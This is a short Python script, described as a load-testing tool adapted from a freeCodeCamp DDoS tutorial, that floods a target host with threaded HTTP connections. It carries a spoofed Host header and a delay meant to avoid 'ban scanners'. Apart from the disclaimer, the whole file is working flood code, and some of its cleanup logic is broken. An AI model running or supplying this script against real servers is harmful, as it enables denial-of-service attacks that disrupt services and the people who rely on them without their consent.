import threading
import socket
import time

# Basic script to be used for load testing; this is a modified DDOS script written by freeCodeCamp.org.
# https://www.youtube.com/watch?v=FGdiSJakIS4
# Do not use this on (or against) a live server without permission, this is for research purposes only; use wisely
# and at your own risk. Author assumes no liability of use or misuse of software.

Target = '192.168.1.28'
Port = 80
FakeIp = '182.21.20.32'
MaxThreads = 500

# Statistic trackers.
Connected = 0
ThreadCount = 0

# Fail safe.
CallAttack = True

# Thread list to cleanup.
ThreadList = []

def attack():
    global CallAttack
    while CallAttack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((Target, Port))
            s.sendto(("GET /" + Target + " HTTP/1.1\r\n").encode('ascii'), (Target, Port))
            s.sendto(("Host: " + FakeIp + "\r\n\r\n").encode('ascii'), (Target,Port))
            s.close()
            global Connected
            Connected += 1
        except:
            # If any of the threads throw an error, stop the test.
            CallAttack = False
    return CallAttack
            
for i in range(MaxThreads):
    # If CallAttach is true, start a new thread.
    if (CallAttack):
        TName = f'Attack{ThreadCount}'
        Thread = threading.Thread(target=attack, name=TName)
        Thread.start()
        ThreadList.append(TName)
        ThreadCount += 1
        if Connected % 50 == 0:
            print(f'Processing connections. Count: {Connected}\r\n')
        # Sleep for 1 second to avoid ban scanners.
        time.sleep(1)
    else:
        # Safely cleanup thread list and prepare for next run.
        for stopThread in ThreadList:
            Thread = threading.Thread(name=stopThread)
            Thread._stop()

# Write statistics to console.        
Message = f'Number of Threads: {ThreadCount}. Number of connections reached on {Target} is: {Connected}'
print(Message)
quit